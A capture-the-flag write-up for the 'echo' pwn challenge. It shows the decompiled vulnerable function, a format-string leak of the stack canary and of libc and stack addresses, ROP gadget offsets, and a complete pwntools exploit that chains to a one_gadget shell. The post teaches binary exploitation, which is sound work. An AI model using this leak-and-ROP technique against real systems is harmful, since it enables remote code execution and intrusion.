---
author: acni
title: "pwn/POC CTF: echo"
pubDatetime: 2025-10-14
slug: echo
description: "Simple pwn exploitation: Abusing a Buffer Overflow and fmtstring leak to leak LIBC and ROP to a onegadget to win"
tags:
  - pwn
---

Things used in this sol: 
- onegadget
- rop chain
- fmtstring leak
- got leak
- canary

First, use pwninit to setup the binary. 

Then, using GDB, checksec the binary for protections. 

```
pwndbg> checksec
File:     /home/tyler/Downloads/echo/chall/chall_patched
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
Stripped:   No
pwndbg> 
```
NX enabled usually means ROP and PIE usually means we need a leak of some sort. 

Next i'm going to disassemble the binary in Ghidra. 

In vuln():
```
void vuln(void)

{
  char *pcVar1;
  long in_FS_OFFSET;
  char local_158 [64];
  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("ur name:");
  pcVar1 = fgets(local_118,0x100,stdin);
  if (pcVar1 == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }

  !!fmtstring vulnerability !!
  printf(local_118);
  puts("\nsend your msg:");

  !!buffer overflow!!
  gets(local_158);
  puts("done");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

The binary takes in input, then displays the input back to us but with a format string vulnerability, meaning we can leak values. Then, it prompts for another input which is a buffer overflow due to gets(). 

Then, I decided to just randomly print values using the format string vulnerability to see if I could leak values from libc or canary. 

```
ur name:
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x7ffff7fb3b03.0xfbad208b.0x7fffffffdbd0.0x1.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0xa2e70252e7025.0x7ffff7fb4760.(nil).0x7ffff7e643f1.0x40.0x7ffff7fb4760.(nil).(nil).0x7ffff7fb05e0.0x7ffff7e61299.0x7ffff7fb4760.0x7ffff7e58f1b.(nil).0x68eec5d6.0x7fffffffdd00.0xe76fcb64e2e13400.0x7fffffffdd00.0x5555555552ce.(nil).

send your msg:
```
Right away, at index 47, we can see the canary was leaked, since canaries on linux always end with 00 (its 0xe76fcb64e2e13400).

To see if I had any got leaks, i did got and looked the values and compared it with some of the values. 

```
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/tyler/Downloads/echo/chall/chall_patched:
GOT protection: Partial RELRO | Found 10 GOT entries passing the filter
[0x555555558000] puts@GLIBC_2.2.5 -> 0x7ffff7e58980 (puts) ◂— push r14
[0x555555558008] getpid@GLIBC_2.2.5 -> 0x7ffff7eb64e0 (getpid) ◂— mov eax, 0x27
[0x555555558010] __stack_chk_fail@GLIBC_2.4 -> 0x555555555056 (__stack_chk_fail@plt+6) ◂— push 2
[0x555555558018] setbuf@GLIBC_2.2.5 -> 0x7ffff7e5f2c0 (setbuf) ◂— mov edx, 0x2000
[0x555555558020] printf@GLIBC_2.2.5 -> 0x7ffff7e335b0 (printf) ◂— sub rsp, 0xd8
[0x555555558028] srand@GLIBC_2.2.5 -> 0x7ffff7e217f0 (srandom) ◂— push rbx
[0x555555558030] fgets@GLIBC_2.2.5 -> 0x7ffff7e57040 (fgets) ◂— push r13
[0x555555558038] time@GLIBC_2.2.5 -> 0x7ffff7fc8fc0 (time) ◂— lea rax, [rip - 0x3fc7]
[0x555555558040] gets@GLIBC_2.2.5 -> 0x7ffff7e58090 (gets) ◂— push r13
[0x555555558048] exit@GLIBC_2.2.5 -> 0x5555555550c6 (exit@plt+6) ◂— push 9 /* 'h\t' */
pwndbg> 
```
Index 43 looked close, and I confirmed that it was relative by running it multiple times using gdb.attach().  

index 43 = 0x7ffff7e58f1b, and puts is 0x7ffff7e58980

```
info proc map gives libc base at 0x7ffff7de1000
pwndbg> p/x 0x7ffff7e58f1b-0x7ffff7de1000
$2 = 0x77f1b
pwndbg> 
so libc leak offset is 0x77f1b.
```

Now that we have a libc leak, and canary leak, we can probably do a rop chain to win. 

To do this, i'll be using one_gadget, an easy way to get a shell, just have to call a gadget but with some criteria.

```
 tyler@tchinpc  ~/Downloads/echo/chall  one_gadget libc.so.6 
0x4c139 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x60 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, r12, NULL} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x4c140 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x60 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xd515f execve("/bin/sh", rbp-0x40, r13)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
 tyler@tchinpc  ~/Downloads/echo/chall  
```
I decided to use the last one, 0xd515f, since I can easily control rbp, rdi, and r13 with a rop chain. 

Now, it's rop chain time. Using

```
ROPgadget --binary libc.so.6 | grep "gadget"
```

I was able to find the offsets of each gadget I needed: 
- pop rdi; ret at 0x277e5
- pop r13; ret at 0x29830
- pop rbp; ret at 0x276ec

Now, I had to find the offset to return instruction and canary. I used cyclic 500 and put it into the gets() buffer. Then, I inspected the registers with pwndbg. 

```
pwndbg> p/x $rbp
$2 = 0x7fffffffdce0
pwndbg> x/gx 0x7fffffffdce0-8
0x7fffffffdcd8:	0x6261616161616171
pwndbg> cyclic -l 0x6261616161616171
Finding cyclic pattern of 8 bytes: b'qaaaaaab' (hex: 0x7161616161616162)
Found at offset 328
pwndbg> 
```
Canary was found at 328, which makes it easy to craft the payload, since rbp is right after canary and then the return address is right after rbp. 

The rop chain was this: 
- 'A' * 328
- canary
- random stuff for rbp
- pop rbp ; ret
- ... 

But i needed to set rbp to somewhere writeable, according to the constraints of the one_gadget. 

So, I decided to get a leak from the fmtstring vuln again. That was easy, looking at index 3, 0x7fffffffdbd0, that was on the stack. But it was close to the rop chain, so i subtracted 100 to move it away. 

now, the rop chain was
- 'A' * 328
- canary
- random stuff for rbp
- pop rbp ; ret
- stackleak -100
- pop rdi ; ret
- 0
- pop r13 ; ret
- 0 
- one_gadget

Final payload: 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    LEAK_OFFSET_IN_LIBC = 0x77f1b 
    POP_RDI_RET_OFFSET = 0x277e5
    POP_R13_RET_OFFSET = 0x29830
    ONE_GADGET_OFFSET  = 0xd515f
    POP_RBP_OFFSET = 0x276ec

    PADDING_TO_CANARY = 328



    r.recvuntil(b"ur name:")
    
    #43 = GOT, #47 CANARY, #3 STACK
    leak_payload = b"%43$p.%47$p.%3$p"
    r.sendline(leak_payload)

    leak_output = r.recvuntil(b"send your msg:", drop=True).decode().strip()

    parts = leak_output.split('.')
    libc_leak_addr = int(parts[0].strip()[2:], 16)
    canary_value = int(parts[1].strip()[2:], 16)
    stack_leak = int(parts[2].strip()[2:], 16)

    log.info(f"leaked libc: {hex(libc_leak_addr)}")
    log.info(f"leaked canary: {hex(canary_value)}")

    # Calculate Libc Base Address
    LIBC_BASE = libc_leak_addr - LEAK_OFFSET_IN_LIBC 
    log.success(f"Libc Base: {hex(LIBC_BASE)}")

    # Calculate final gadget addresses
    POP_RDI_RET_ADDR = LIBC_BASE + POP_RDI_RET_OFFSET
    POP_R13_RET_ADDR = LIBC_BASE + POP_R13_RET_OFFSET
    ONE_GADGET_ADDR = LIBC_BASE + ONE_GADGET_OFFSET
    POPRBPADDR = POP_RBP_OFFSET + LIBC_BASE

    log.success(f"pop rdi {hex(POP_RDI_RET_ADDR)}")
    log.success(f"pop r13 {hex(POP_R13_RET_ADDR)}")
    log.success(f"one_gadget  {hex(ONE_GADGET_ADDR)}")

    rop = p64(POPRBPADDR)
    rop += p64(stack_leak-100)
    rop += p64(POP_RDI_RET_ADDR) 
    rop += p64(0)               
    rop += p64(POP_R13_RET_ADDR) 
    rop += p64(0) 
    rop += p64(ONE_GADGET_ADDR) 

# Padding -> Canary -> RBP Junk -> ROP Chain
    payload = b"\x00" * PADDING_TO_CANARY
    payload += p64(canary_value)       
    payload += b'A'*8  
    payload += rop                     

    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
```


gg!

# **Harder pwn writeups coming soon**
